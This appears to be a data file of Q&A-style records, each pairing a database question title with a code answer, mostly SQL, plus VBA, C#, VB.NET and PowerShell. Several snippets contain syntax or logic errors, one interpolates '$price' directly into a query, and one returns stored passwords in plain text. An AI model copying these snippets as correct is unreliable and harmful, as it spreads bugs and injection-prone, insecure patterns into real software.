    WHERE rowstatus = 'A'
) t
WHERE t.RowNum > 1
"
5121,109,Group data based on certain value,"SELECT xid, repeat_status FROM x 

GROUP BY xid,repeat_status
"
35420,3735,How to Create MySQL Query to Find Related Posts from Multiple Tables?," SELECT article_id, count(*) as common_term_count FROM 
      (
      SELECT article_id FROM tags WHERE tag IN 
         (SELECT tag FROM tags WHERE article_id = :YourArticle)
      UNION ALL 
      SELECT article_id FROM categories WHERE category IN
         (SELECT category FROM categories WHERE article_id = :YourArticle)
       ) AS accumulator_table 
 GROUP BY article_id ORDER common_term_count DESC
"
24962,151,How to get total number of users per city by using SQL Query,"SELECT t2.cityName
    ,count(t1.cityId) AS Users_from_city
FROM [User] t1
INNER JOIN city t2 ON t1.cityId = t2.cityId
GROUP BY t2.cityName
"
34856,26117,Remove a column after selection with SQL,"SELECT
     sum_columnB
FROM
(SELECT 
    columnA
    , SUM(columB) sum_columnB
FROM Table
GROUP BY columnA
ORDER BY columnA
       , sum_columnB) resultset
"
38546,18597,MySQL Count the rows of which there are most,"select owner, count(*) cntx
  from businesses
 group by owner
 order by cntx desc
 limit 1
"
27474,46189,"MySQL merge results into table from count of 2 other tables, matching ids","UPDATE model
   JOIN (
       SELECT model_views.model_id, COUNT(*) AS c 
       FROM model_views
       GROUP BY model_views.model_id
       UNION ALL
       SELECT model_views2.model_id, COUNT(*) AS c 
       FROM model_views2
       GROUP BY model_views2.model_id) toupdate ON model.id = toupdate.model_id
SET model.views = toupdate.c
"
2570,31977,query in Vba using cdate function with variable,"Function SQLDate(varDate As Date) As String
'---------------------------------------------------------------------------------------
'Purpose    Formats a date in the american way so that it can be used in
'           SQL (by the JET-engine)
'Accepts    varDate - the date that should be converted to text
'Returns    The date converted to text, in american format with both the day and
'           the month using 2 characters.  (01 is january)
'---------------------------------------------------------------------------------------
'Changelog
'HANY 20100407: Stopped using the FORMAT-function for the date-value, as I found some
'               cases where the format did not return the date as specified.
'---------------------------------------------------------------------------------------

    'SQLDate = ""#"" & Format$(varDate, ""mm\/dd\/yyyy"") & ""#""
    SQLDate = ""#"" & Format(Month(varDate), ""00"") & ""/"" & Format(Day(varDate), ""00"") & ""/"" & Format(Year(varDate), ""0000"") & ""#""
End Function
"
24498,51804,How to group values of one column based on condition in t-sql?,"select v.vra_uid, COUNT(v.visit_uid) as number_of_visits , SUM(case when v.visit_cause = 1 then 1 else 0 end) as visits_with_cause_equal_1
from visits v 
group by v.vra_uid
"
31512,24609,Database Design for Transport timetable system,"select 
    src.TrnNumber,
    srcSt.StnName as SourceStation, 
    srcSt.StnCity as SourceCity,
    src.DepTime,
    destSt.StnName as DestinationStation,
    destSt.StnCity as DestinationCity,
    dest.ArrTime,
    (abs(dest.HopIndex - src.HopIndex)) as Stops
from
    TrainHopTbl src
    inner join TrainHopTbl dest on
        src.TrnNumber = dest.TrnNumber
    inner join StationTbl srcSt on
        src.StnCode = srcSt.StationCode
    inner join StationTbl destSt on
        dest.StnCode = destSt.StationCode
where
    src.StnCode = 'WDC'
    and dest.StnCode = 'NYC'
    and src.HopIndex < dest.HopIndex
order by
    Stops asc,
    DepTime asc
"
2098,53945,SQL Server: Partial match of two SQL columns,"DECLARE @t TABLE
(
    Column01 VARCHAR(20),
    Column02 VARCHAR(100)
)

INSERT INTO @t (Column01, Column02)
VALUES ('125', 'Length of room is 125 meter only')

SELECT *
FROM @t
WHERE CHARINDEX(Column01, Column02) > 0     
"
26557,32147,SQL Tables: Store references to an unknown number of rows in table A in a single record in table B,"PeopleServiceLink:
PersonID,
ServieTicketID,
PRIMARY KEY (PersonID, ServieTicketID)
"
32368,30595,How to optimize a cycle in stored procedure [T-SQL],"--param of SP
DECLARE @DATASTART DATETIME = '2014-11-28 06:00:00'
DECLARE @DATAEND DATETIME = '2014-11-28 21:00:00'
DECLARE @Shift VARCHAR(50) = 'All'

--body
DECLARE @TemporaryTable2 TABLE
  (
     id        INT,
     startdate DATETIME,
     enddate   DATETIME
  )

DECLARE @id INT = 0

IF @Shift LIKE 'All'
BEGIN
    INSERT INTO @TemporaryTable2
    SELECT N.number + 1 AS id,
           startdate,
           enddate
    FROM   master..spt_values N
           CROSS apply (SELECT Dateadd(dd, N.number, @DATASTART),
                               Dateadd(dd, N.number + 1, @DATASTART)) AS D(startdate, enddate)
    WHERE  N.number BETWEEN 0 AND Datediff(dd, @DATASTART, @DATAEND)
           AND N.type = 'P'
END
ELSE
BEGIN
    INSERT INTO @TemporaryTable2
    SELECT N.number + 1 AS id,
           startdate,
           enddate
    FROM   master..spt_values N
           CROSS apply (SELECT Dateadd(MINUTE, N.number * 15, @DATASTART),
                               Dateadd(MINUTE, ( N.number + 1 ) * 15, @DATASTART)) AS D(startdate, enddate)
    WHERE  N.number BETWEEN 0 AND ( Datediff(MINUTE, @DATASTART, @DATAEND) / 15 )
           AND N.type = 'P'
END

SELECT *
FROM   @TemporaryTable2 
"
23068,2801,Django SQL query for each include/extends,"DEBUG_TOOLBAR_PANELS = (
    'debug_toolbar.panels.version.VersionDebugPanel',
    'debug_toolbar.panels.timer.TimerDebugPanel',
    'debug_toolbar.panels.settings_vars.SettingsVarsDebugPanel',
    'debug_toolbar.panels.headers.HeaderDebugPanel',
    'debug_toolbar.panels.request_vars.RequestVarsDebugPanel',
   # 'debug_toolbar.panels.template.TemplateDebugPanel',
    'debug_toolbar.panels.sql.SQLDebugPanel',
    'debug_toolbar.panels.signals.SignalDebugPanel',
    'debug_toolbar.panels.logger.LoggingPanel',
)
"
7329,866,Results based on column value in SQL Server,"WITH candidates AS (
SELECT Column1, Column2
  FROM Table1
  WHERE Column2 = 'Value20'
)
SELECT t.Column1, t.Column2
  FROM Table1 t
  JOIN candidates c ON (c.Column1 = t.Column1 AND t.Column2 <> 'Value20')
"
2956,48757,Oracle sql split string in chuncks,"select regexp_substr(s, '.{5}', 1, lvl) chnk 
from (select s, level lvl 
      from (select '00000111112222233333' s from dual) 
      connect by level <= length(s) / 5);
"
7754,46038,SQL Update query and a Where clause,"UPDATE A
SET    A.Description = B.Description
FROM   Teacups A
       JOIN (SELECT Description,
                    FriendlyName
             FROM   teacups
             WHERE  MaterialID = 1) b
         ON a.FriendlyName = B.FriendlyName 
Where A.MaterialID != 1 
"
39140,13585,Price Comparision in mysql query,"SELECT * FROM tableA
WHERE (CASE priceType WHEN 1 THEN price WHEN 2 THEN price * (800000 / 1000) END) <= $price
"
2095,18747,Find distinct child rows which have more than 1 parent in the same table Oracle,"select 1st_level_id
from your_table
group by 1st_level_id
having count(distinct 0th_level_id) > 1
"
30334,48421,How to get elements from table by row number in sql server,"ALTER PROCEDURE getGalleryImagesByPaging
@startIndex int,
@endIndex int
AS
BEGIN
Select ImageId,
       Caption 
       from   imagegalleries 
       where ishome=1 and IsActive=1 
       ORDER BY id desc OFFSET @startIndex ROWS FETCH NEXT @endIndex ROWS ONLY
END
GO
"
986,10679,SQL Multiple Rows to Single Row Multiple Columns,"select PersonID, Name,
       sum(case when Status = 'Fail' then 1 else 0 end) as FailedTotal,
       sum(case when Status = 'Pass' then 1 else 0 end) as PassedTotal
from UserReport
group by PersonID, Name;
"
13645,48796,Database model for user subscriptions,"class Topic(models.Model):
    name = ...

class Article(models.Model):
    content = ...
    topics = models.ManyToManyField(Topic)
"
21841,62290,sql query to calculate weighted points,"SELECT A.USER_ID,SUM(NEW_POINTS)
FROM
(
SELECT USER_ID,
       CASE WHEN grade = 'a'
            THEN points=3
            WHEN grade = 'b'
            THEN points=2
            WHEN grade = 'c'
            THEN points=1
            END AS new_points
FROM table_post
) A   
GROUP BY A.USER_ID;
"
14961,30533,Add float type field in Sql update query,"mysql> select CAST(4.3 AS DECIMAL);
+----------------------+
| CAST(4.3 AS DECIMAL) |
+----------------------+
|                    4 |
+----------------------+
1 row in set (0.00 sec)

mysql> select CAST(4.3 AS DECIMAL(10,5));
+----------------------------+
| CAST(4.3 AS DECIMAL(10,5)) |
+----------------------------+
|                    4.30000 |
+----------------------------+
1 row in set (0.00 sec)

mysql> select CAST(4.3 AS DECIMAL(10,5)) = CAST(4.2 AS DECIMAL(10,5));
+---------------------------------------------------------+
| CAST(4.3 AS DECIMAL(10,5)) = CAST(4.2 AS DECIMAL(10,5)) |
+---------------------------------------------------------+
|                                                       0 |
+---------------------------------------------------------+
1 row in set (0.00 sec)

-- Add some decimal
UPDATE cfbnv_rg_lead_detail SET value='Address' WHERE lead_id='175' && form_id='1' && CAST(field_number AS DECIMAL(10,5)) = CAST(4.2 AS DECIMAL(10,5)).
"
26825,63735,making an update query through a subquery using ROW_NUMBER()?,"MERGE INTO table_name t
USING ( SELECT rowid rid, row_number() OVER (order by sequence_job_day) rn FROM table_name ) u
ON ( t.rowid = u.rid AND t.column_pearson_id = 888 )
WHEN MATCHED THEN UPDATE SET t.column_update = u.rn;
"
6926,56008,Change inserted value with trigger,"CREATE OR REPLACE TRIGGER NumberOfBooks
BEFORE INSERT
ON book
FOR EACH ROW
BEGIN 
  IF :new.nobook < 10 THEN
    :new.nobook = 10;
  END IF;
END;
"
8040,8093,Merge two sql queries,"  insert into userT 
  select 'bbb', coalesce(max(subid),0)+1 from userT where name = 'bbb';
"
22130,75411,JOIN on row by which row in the join query has the MAX/MIN value of all rows,"--------------------------------------------------------------------------------
-- Set up the sample data from the question.
--------------------------------------------------------------------------------
declare @Contact table (IDApplication int, ContactDate date, CInfo varchar(32));
declare @Reply table (IDApplication int, ReplyDate date, RInfo varchar(32));

insert @Contact values
    (1, '2016-06-01',' pie'),
    (1, '2016-01-10', 'cake'),
    (1, '2015-02-03', 'banana'),
    (2, '2016-06-03', 'cake'),
    (2, '2015-12-23', 'apple');
insert @Reply values
    (1, '2016-05-30', 'circle'),
    (1, '2016-05-03', 'square'),
    (1, '2015-02-04', 'triangle'),
    (1, '2016-01-14', 'pentagon'),
    (2, '2016-06-04', 'square'),
    (2, '2016-02-01', 'pentagon'),
    (2, '2016-06-10', 'circle');

--------------------------------------------------------------------------------
-- Step 1: Sequence each group of contacts by contact date.
--------------------------------------------------------------------------------
with OrderedContactCTE as
(
    select
        *,
        [Sequence] = row_number() over (partition by IDApplication order by ContactDate)
    from
        @Contact
),

--------------------------------------------------------------------------------
-- Step 2: Match each contact with the subsequent contact (where one exists)
--         having the same IDApplication value. The date of the subsequent
--         contact will act as the upper bound on reply dates that are valid for
--         the original contact. Assign each contact a unique identifier that
--         we'll use in the following step.
--------------------------------------------------------------------------------
PairedContactCTE as
(
    select
        UniqueID = row_number() over (order by Contact.IDApplication, Contact.[Sequence]),
        Contact.IDApplication,
        Contact.ContactDate,
        Contact.CInfo,
        NextContactDate = NextContact.ContactDate
    from
        OrderedContactCTE Contact
        left join OrderedContactCTE NextContact on
            Contact.IDApplication = NextContact.IDApplication and
            Contact.[Sequence] = NextContact.[Sequence] - 1
),

--------------------------------------------------------------------------------
-- Step 3: Match every contact with all replies that are strictly after the 
--         original contact date and, where applicable, strictly before the 
--         subsequent contact date. For each unique contact, sequence the 
--         replies in reverse order by reply date.
--------------------------------------------------------------------------------
OrderedResponseCTE as
(
    select
        Contact.*,
        Reply.ReplyDate,
        Reply.RInfo,
        [Sequence] = row_number() over (partition by Contact.UniqueID order by Reply.ReplyDate desc)
    from
        PairedContactCTE Contact
        left join @Reply Reply on
            Contact.IDApplication = Reply.IDApplication and
            Contact.ContactDate < Reply.ReplyDate and
            (
                Contact.NextContactDate is null or
                Contact.NextContactDate > Reply.ReplyDate
            )
)

--------------------------------------------------------------------------------
-- Step 4: Finally, select each contact and the date/info of the latest reply
--         which is an eligible match for that contact.
--------------------------------------------------------------------------------
select
    IDApplication,
    ContactDate,
    CInfo,
    ReplyDate,
    RInfo
from 
    OrderedResponseCTE 
where 
    [Sequence] = 1;
"
13815,55465,SQL CLR stored procedure output,"[SqlProcedure]
public static void GetAllocations()
{
    // define table structure
    SqlDataRecord rec = new SqlDataRecord(new SqlMetaData[] {
        new SqlMetaData(""ID"", SqlDbType.Int),
        new SqlMetaData(""UserName"", SqlDbType.VarChar),
        new SqlMetaData(""UserPassword"", SqlDbType.VarChar),
    });

    // start sending and tell the pipe to use the created record
    SqlContext.Pipe.SendResultsStart(rec);
    {
        // send items step by step
        foreach (User user in GetUsers())
        {
            int id = user.ID;
            string userName = user.UserName;
            string userPassword = user.UserPassword;

            // set values
            rec.SetSqlInt32(0, id);
            rec.SetSqlString(1, userName);
            rec.SetSqlString(2, userPassword);

            // send new record/row
            SqlContext.Pipe.SendResultsRow(rec);
        }
    }
    SqlContext.Pipe.SendResultsEnd();    // finish sending
}
"
126,16751,Select users and order them by their article total views,"SELECT user_id, SUM(views) AS sum_of_views
FROM articles
GROUP BY user_id
ORDER BY SUM(views) DESC
"
16448,5747,Optimizing SQL query,"DELETE rating 
FROM rating 
LEFT JOIN user ON user.id = rating.userId 
WHERE user.id IS NULL
"
2638,57025,SQLite queries much slower using JDBC than in Firefox SqliteManager plugin,"... JOIN Leagues l1 INDEXED BY MyThreeColumnIndex ON ...
"
17680,53599,'like' clause should be processed for the first 3 character of a column,"SELECT name FROM emp WHERE LEFT(name, 5) LIKE '%jo%'
"
34940,58767,SQL query to return all rows that contain duplicate data from one field,"Select * from CardTable where cardid in ( select cardid from CardTable group by cardid having count(cardid) > 1)
"
10853,23571,Querying Oracle Clob datatype,"SET SQLBL ON;
SET DEFINE OFF;

CREATE TABLE CLOB_TEST
(
clob_in CLOB
);

INSERT
INTO CLOB_TEST VALUES
  (
    'I am working as a DBA and senior database resource in L&T Infotech in Pune India'
  );


SELECT DBMS_LOB.SUBSTR(CLOB_IN,3000) ot FROM CLOB_TEST;

-----------------------------OUTPUT------------------------------------------

OT
I am working as a DBA and senior database resource in L&T Infotech in Pune India

-----------------------------OUTPUT------------------------------------------
"
20531,27669,selecting an attribute from XML in SQL,"declare @t table (col xml);
insert @t select '
<root><row statusID=""ALL"" subID=""ALL"" viewMaskFields=""false"" masID=""219"" 
userID=""13"" prptyDate=""08/19/2011"" docID=""21b15c9e-76a5-44ed-afbb-96b6df2cf881"" 
resmID=""8806"" leaID=""6345"" reshID=""3560"" doEmail="""" emailFrom="""" emailTo="""" 
emailMsg=""penarands"" emailSubject="""" fieldList=""1"" fmtID=""2"" OptInCES=""Yes"" 
SendVaiEmailCES=""1"" RPIPMCURL=""lm-10-254-9-52.onesitedev.realpage.com"" /><Custom>
<UpdateResidentLetter><Row Status=""NOTPRINTED"" Notes=""Created from bulk letters
 interface"" /></UpdateResidentLetter></Custom></root>';

select col.value('(/root/row/@emailMsg)[1]','varchar(max)') emailMsg
from @t

-- result
penarands
"
4162,61722,SQL select MAX(COUNT),"SELECT ""name"", count(*) maximum FROM ""users"" 
   INNER JOIN ""microposts"" ON ""microposts"".""user_id"" = ""users"".""id"" 
GROUP BY users.id 
ORDER BY maximum DESC 
LIMIT 1
"
7068,25750,"SQL Help - How to ""linearize"" data?","SELECT MAX(CASE WHEN f.name = 'item_name' THEN fd.value ELSE NULL END) AS item_name,
       MAX(CASE WHEN f.name = 'item_price' THEN fd.value ELSE NULL END) AS item_price,
       MAX(CASE WHEN f.name = 'first_name' THEN fd.value ELSE NULL END) AS first_name,
       MAX(CASE WHEN f.name = 'last_name' THEN fd.value ELSE NULL END) AS last_name
  FROM FIELDDATA fd
  JOIN FIELD f ON f.id = fd.fieldid
"
28531,5176,"oracle counting null value, which is more appropriate?","SELECT SUM(n_count), SUM(x_count)
FROM
     (SELECT CASE WHEN resp_cd IS NULL THEN 1 END n_count,
          CASE WHEN resp_cd = 'x' THEN 1 END x_count
     FROM your_table
     );
"
27924,57589,Newbie question : N-N join that matches ALL a list,"  SELECT p.id
    FROM PRODUCTS p
    JOIN PRODUCTS_CATEGORIES pc ON pc.product_id = p.id
    JOIN CATEGORIES c ON c.id = pc.category_id
   WHERE c.id IN (3,4,5)
GROUP BY p.id
  HAVING COUNT(DISTINCT c.id) = 3
"
31330,40716,Proper way to bind SQL NULL to ASP.NET Control?,"Public Function EmployeeSearchStatus(ByVal SeparationDate As Object, ByVal PositionTitle As Object, ByVal EffectiveDate As Object) As String
    If IsDBNull(SeparationDate) Then
        Return ""Currently Employed as "" + PositionTitle + "" (effective "" + EffectiveDate + "").""
    Else
        Return ""Last Employed as "" + PositionTitle + "" (separated on "" + SeparationDate + "").""
    End If
End Function
"
32625,42572,LightSwitch Linq To Entities query problem !,"Dim vt = From od In Me.Context.DetailsVentes
     Group By Month = od.Vente.DateCommande.Month, Year = od.Vente.DateCommande.Year
     Into g = Group
     Select New VentesParMois With {.Month = Month, .Year = Year,
                                   .TotalVentesSingle = g.Sum(Function(od) _
                                       (od.PrixUnitaire * od.Quantité))}



Dim at = From od In Me.Context.DetailsAchats
      Group By Month = od.Achat.DateCommande.Month, Year = od.Achat.DateCommande.Year
      Into g = Group
      Select New AchatsParMois With {.Month = Month, .Year = Year, 
                                    .TotalAchatsSingle = g.Sum(Function(od) _
                                        (od.PrixAchat * od.Quantité))}


Dim ct = From od In Me.Context.Charges
     Group By Month = od.DateCharge.Month, Year = od.DateCharge.Year
     Into g = Group
     Select New ChargesParMois With {.Month = Month, .Year = Year, 
                                   .TotalChargesSingle = g.Sum(Function(od) _
                                       (od.Montant))}



Dim q = From a In at.AsEnumerable, v In vt.AsEnumerable, c In ct.AsEnumerable
        Where a.MonthYear = v.MonthYear AndAlso a.MonthYear = c.MonthYear
                Select New TCR With {.Month = a.Month, .Year = a.Year, .TotalAchats = a.TotalAchats, .TotalVentes = v.TotalVentes, .TotalCharges = c.TotalCharges}


Return q.AsQueryable
"
834,60253,Read XML document stored in SQL Server 2008 R2 with XML datatype,"SELECT
    Barcode = Container.value('(BARCODE)[1]', 'int'),
    CategoryID = Container.value('(CATEGORYID)[1]', 'int'),
    Name = Container.value('(NAME)[1]', 'varchar(50)'),
    GWT = Container.value('(GWT)[1]', 'decimal(10, 3)'),
    NWT = Container.value('(NWT)[1]', 'decimal(10, 3)'),
    LAM = Container.value('(LAM)[1]', 'decimal(10, 3)'),
    QTY = Container.value('(QTY)[1]', 'int'),
    Quantity = Container.value('(QUANTITY)[1]', 'int'),
    Remarks = Container.value('(REMARKS)[1]', 'varchar(50)')
FROM
    dbo.YourTableHere
CROSS APPLY 
    XmlColumnHere.nodes('/container/NewDataSet/Containers') AS T(Container)
WHERE
    ID = 1
"
10066,29120,Reduce the number of characters in an SQL function in Oracle database,"select c,s,f as f,d as d, v as v from (mysql)
UNION ALL
select c,s,f+(select max(d)-min(d) from mysql)+t.r as f,d+(select max(d)-min(d) from mysql)+t.r as d,0 as v 
from (mysql)
CROSS JOIN 
(
SELECT Rownum r
FROM  dual
CONNECT BY Rownum <= 15
) t
"
14473,73917,beginners question about creating relationships between tables,"create table TableB (
    Id int primary key identity(1,1),
    Name varchar(255))

create table TableA (
    Id int primary key identity(1,1),
    Name varchar(255),
    TableBRelation int unique,
    foreign key (TableBRelation) references TableB (Id))
"
2456,69771,How do I get the records from the left side of a join that do not exist in the joined table?,"select distinct u.id,
    u.lastname
from user u
left join context ct on ct.userid = u.id
where ct.userid is null
"
8269,39352,Limit length of longtext field in SELECT results,"SELECT SUBSTRING(`text`, 1, 100) FROM blog_entry;
"
2694,28341,Entity Relationship - Best way to handle relationship that expires after time,"class Booking
{
    public virtual Passenger Passenger { get; set; }
    public virtual Trip Trip { get; set; }
    public virtual Seat Seat { get; set; }
}
"
2434,69785,Need help in SQL Select Query,"select *
from a
where a_id in (1,2,3,4)
and
(
  flag = 'Y' 
  or 
  (select sum(qty) from b where b.a_id = a.a_id) > 0
)
"
25144,28388,SQL to combine 2 tables,"SELECT names.Id, names.f_name, names.l_name, prices.item_name, prices.item_price
FROM names
 LEFT OUTER JOIN prices
   ON names.Id = prices.Id
"
20383,61762,Compare value of a row with multiple rows in another table,"SELECT * FROM orders o
LEFT JOIN OrderedItems ei
ON o.Price = ei.Price WHERE ei.Price is NULL
"
25640,19403,SQL server select distinct rows using most recent value only,"select t1.* from (select ForeignKeyId,AttributeName, max(Created) AS MaxCreated
from  YourTable
group by ForeignKeyId,AttributeName) t2
join YourTable t1 on t2.ForeignKeyId = t1.ForeignKeyId
and t2.AttributeName = t1.AttributeName
and t2.MaxCreated = t1.Created
"
21525,50642,I'm experiencing Oracle join problems with this join,"SELECT      
  first_name, last_name, countries.country, email
FROM        
  people 
JOIN pubauthor_people ON
  People.people_id = pubauthor_people.people_id 
JOIN countries ON 
   countries.country_id = people.mail_country_id 
"
24296,44391,Cart stock return query,"UPDATE ct_products AS P
JOIN ct_shopping_cart_products AS SCP ON (SCP.product = P.id)
JOIN (SELECT product,cart,SUM(qty) as qty FROM ct_shopping_cart_products
      GROUP BY product,cart) AS SCP2 ON (SCP.product = SCP2.product
                                     AND SCP.cart = SCP2.cart)
SET 
P.stockQty = P.stockQty + SCP2.qty, 
SCP.qty=0 
WHERE SCP.cart=0
"
39666,56226,Update Value in Sql,"SELECT DocNumber, SUM(Qty) AS TotalAmountQty 
INTO #temp
FROM Retail.XDealDetail
GROUP BY DocNumber

UPDATE Retail.XDeal
SET ContractQty = A.ContractQty - B.TotalAmountQty
FROM    Retail.XDeal A
        JOIN #temp B ON A.DocNumber = B.DocNumber;

DROP TABLE #temp;
"
4894,50039,compiling invalid oracle procedures,"CREATE OR REPLACE PROCEDURE proc_main AS
BEGIN

   EXECUTE IMMEDIATE 'BEGIN proc_child1; END;';

   EXECUTE IMMEDIATE 'BEGIN proc_child2; END;';

   EXECUTE IMMEDIATE 'BEGIN proc_child3; END;';

   proc_compile_invalids;  -- This invokes 
                           -- ""alter procedure <procedure_name> compile"" 
                           -- statement for all the invalids.

END;
"
35372,33874,Fetch only N rows at a time (MySQL),"SELECT * FROM table LIMIT 0,20
"
39042,10618,Generate Scripts equivalent for Transact SQL,"   //Connect to the local, default instance of SQL Server. 
  Server srv = new Server(); 

   //Reference the AdventureWorks2008R2 database.  
  Database db = srv.Databases[""AdventureWorks2008R2""]; 

   //Define a Scripter object and set the required scripting options. 
  Scripter scrp = new Scripter(srv); 
   scrp.Options.ScriptDrops = false; 
   scrp.Options.WithDependencies = true; 

   //Iterate through the tables in database and script each one. Display the script. 
   //Note that the StringCollection type needs the System.Collections.Specialized namespace to be included. 
   Microsoft.SqlServer.Management.Sdk.Sfc.Urn[] smoObjects = new Microsoft.SqlServer.Management.Sdk.Sfc.Urn[1] ;
   foreach (Table tb in db.Tables) {   
      smoObjects[0] = tb.Urn; 
      if (tb.IsSystemObject == false) { 
         System.Collections.Specialized.StringCollection sc;
         sc = scrp.Script(smoObjects); 
         foreach ( string st in sc) { 
            Console.WriteLine(st); 
         } 
      } 
   } 
"
34478,64005,question regarding use of MySQL triggers,"DELIMITER |

DROP TRIGGER /*!50032 IF EXISTS */ `trigger_update_results_tb`|

CREATE TRIGGER `trigger_update_results_tb` BEFORE UPDATE ON `results_tb` 
    FOR EACH ROW BEGIN
       CASE FLOOR(NEW.score / 10)
        WHEN 0 THEN SET NEW.grade = 'F';
        WHEN 1 THEN SET NEW.grade = 'F';
        WHEN 2 THEN SET NEW.grade = 'F';
        WHEN 3 THEN SET NEW.grade = 'F';
        WHEN 4 THEN SET NEW.grade = 'D';
        WHEN 5 THEN SET NEW.grade = 'C';
        WHEN 6 THEN SET NEW.grade = 'B';
        ELSE SET NEW.grade = 'A';
       END CASE;
    END;
|

DELIMITER ;
"
24905,46058,I am trying do utilize the COUNT() function unsuccessfully," CREATE VIEW v_count AS
 SELECT assignment_no, COUNT(*) as ct
 FROM assignment
 group by assignment_no
"
39954,34305,What is a SQL statement to select an item that has several attributes in an item/attribute list?,"select  item.name 
from    item 
where   item.attribute in ('4 legs', 'green') 
group by item.name 
having  count(distinct item.attribute) = 2
"
4544,24727,Need Select top 10 people SQL,"SELECT user_id, COUNT(follow_id) AS total_followers
FROM users 
GROUP BY follow_id 
ORDER BY total_followers LIMIT 10;
"
11322,62818,SQL Query across multiple SQL servers,"SELECT  *
FROM    [Db1].[dbo].table1 A
INNER JOIN [Server2].[Db1].[dbo].table2 B 
ON A.Id = B.Id
"
2020,21594,How to in SQL return first found primary key for criteria that has duplicates,"select * from t1 where ID in(select min(Id) FROM t1 group by Class1, Class2, Class3)
"
36561,62101,Incomprehensible query result looking for rows in a query which are not in other query,"select distinct IdDireccionIne
from DireccionIne as DI  -- 29.970
where IdDireccionIne not in (select distinct DireccionCorregida.IdDireccionIne
                             from DireccionCorregida
                             where DireccionCorregida.IdDireccionIne is not null)
"
23244,58333,How to create horizontal columns from rows in MYSQL?,"SELECT
      g.studNumber,
      g.subjCode,
      MAX( case when g.period = 1 then g.grade else 0 end ) as 1st_period,
      MAX( case when g.period = 2 then g.grade else 0 end ) as 2nd_period,
      MAX( case when g.period = 3 then g.grade else 0 end ) as 3rd_period,
      MAX( case when g.period = 4 then g.grade else 0 end ) as 4th_period,
      AVG( g.grade ) as Ave
   from
      Grades g
   group by 
      g.studNumber,
      g.subjCode
"
14963,16292,XML To Sql Server,"SELECT 
    XUsers.value('(PartitionKey)[1]', 'NCHAR(10)') AS 'partition_key'  
FROM 
    (SELECT 
        BulkXML = CAST(BulkColumn AS XML)
     FROM 
        OPENROWSET(BULK 'C:\Program Files\Microsoft SQL Server\MSSQL10.MSSQLSERVER\MSSQL\Backup\SkillageXML\userstest1111.xml', SINGLE_BLOB) AS BX 
    ) AS T
CROSS APPLY 
    BulkXml.nodes('/Users/User') AS XTbl(XUsers);and returns:

partition_key
be-BY     
"
13530,32845,sql join with foreign key table,"SELECT *
FROM wcf13_user user_table u
WHERE user_table.email LIKE ""%@gmail.com"" -- Has a gmail account
  AND NOT EXISTS (                        -- Is not a member of group #4
       SELECT *
       FROM wcf13_user_to_group g
       WHERE u.userID=g.userID AND groupID = 4
  )
"
12281,23080,SQL Statement as datasource for listbox VB.NET," Dim newRow = ds.Tables(""room"").NewRow()
 newRow(""StartDatum"") = DateTime.Today
 newRow(""EindDatum"") = DateTime.Today.AddDays(7)
 newRow(""KamerNummer"") = roomNumber
 ....
 newRow(""combinatie"") = DateTime.Today.ToShortDateString() & ""-"" & _ 
                        DateTime.Today.AddDays(7).ToShortDateString() & _ 
                        "":room "" & roomNumber.ToString()
ds.Tables(""room"").Rows.Add(newRow)
"
27590,88,Copying data into table A into table B (Is Identity == Yes)," set identity_insert tableB on

 insert tableB (Id, field1, field2)
 select id, field1, field2 from tablea

 set identity_insert tableB off
"
1748,45989,Query With Join,"return ((from table1 in this.GetContext<Fake>().TABLE1.Include(""TABLE2"").Include(""TABLE3"")
        where (
      ............. )
        select).ToList<Table1>());
"
5007,70741,SQL query to pivot table on column value,"select 
  max(case when teamid = 1 then playername else '' end) Team1,
  max(case when teamid = 2 then playername else '' end) Team2
from
(
  select TeamId,
    PlayerName,
    (select count(*)
     from yourtable d
     where t.teamId = d.TeamId
       and t.playername <= d.PlayerName) rn
  from yourtable t
) d
group by rn;
"
37823,60814,SQL create category path/tree/hierachy,"select coalesce(down3.Id, down2.Id, down1.Id, root.Id), root.name  as root_name
 , down1.name as down1_name
 , down2.name as down2_name
 , down3.name as down3_name
"
16167,60390,Advanced MySQL time sum,"SELECT SEC_TO_TIME(SUM(TIME_TO_SEC(t.time))) as time FROM 
(SELECT TIMEDIFF('24:00:00',(TIMEDIFF('22:00:00',TIME(end)))) AS time
FROM sn_workingtime
WHERE user='magdalena'
AND type='work'
AND start >= '2014-03-01' AND start <= '2014-03-31 23:59:59'
AND (HOUR(`end`) > 22 OR HOUR(`end`) < 4)
AND completed=1)t;
"
33199,70555,MSSQL Query to delete duplicate rows from a TABLE leaving distinct rows in table,"DELETE FROM Log WHERE LogId NOT IN 
 (SELECT Min(LogId) FROM Log GROUP BY customer_id, deactivation_date)
"
28511,53321,Combining SQL Server table data,"INSERT  INTO #statsTable 
            (
            s_fullname, 
            s_agent, 
            s_calls, 
            s_holdtime, 
            s_talktime, 
            s_wrapuptime, 
            s_pitches, 
            s_dialtime, 
            s_campaign,
            s_dialdate,
            s_upamount  --<<new
            )
SELECT      agent.name, 
            agent.code, 
            calls, 
            holdtime, 
            talktime, 
            wrapuptime, 
            pitches, 
            dialtime, 
            campaign,
            dialdate,
            r.up_sale     --<<like this?  
FROM    ""stats"" s
            INNER JOIN agent a 
                ON s.agent = a.code
            INNER JOIN results r 
                ON s.campagin  = r.campaginid  
WHERE   dialdate = '02-27-2013';


SELECT * 
FROM #statsTable;
"
18209,62983,Having some troubles finding a string for in MySQL,"select * from foo where Concat(foo) regexp '(bar).*(bar)';
"
15092,5693,PowerShell Function multiple SQL queries output as CSV,"Function Run-Query
{
    param([string[]]$queries,[string[]]$sheetnames)
    Begin
    {
        $SQLServer = 'ServerName'
        $Database = 'DataBase'
        $SqlConnection = New-Object System.Data.SqlClient.SqlConnection
        $SqlConnection.ConnectionString = ""Server = $SQLServer; Database = $Database; Integrated Security = True""
    }#End Begin
    Process
    {
        # Loop through each query
        For($i = 0; $i -lt $queries.count; $i++)
        {
            $SqlCmd = New-Object System.Data.SqlClient.SqlCommand

            # Use the current index ($i) to get the query
            $SqlCmd.CommandText = $queries[$i]

            $SqlCmd.Connection = $SqlConnection
            $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter
            $SqlAdapter.SelectCommand = $SqlCmd
            $DataSet = New-Object System.Data.DataSet
            $SqlAdapter.Fill($DataSet)

            # Use the current index ($i) to get the sheetname for the CSV
            $DataSet.Tables[0] | Export-Csv -NoTypeInformation -Path ""C:\Scripts\$($sheetnames[$i]).csv""
        }
    }#End Process
    End
    {
        $SqlConnection.Close()
    }
}#End function run-query.

$queries = @()

$queries += @'
Select * from something
'@
$queries += @'
Select * from something2
'@

$sheetnames = @()
$sheetnames += 'Cert'
$sheetnames += 'Prod'

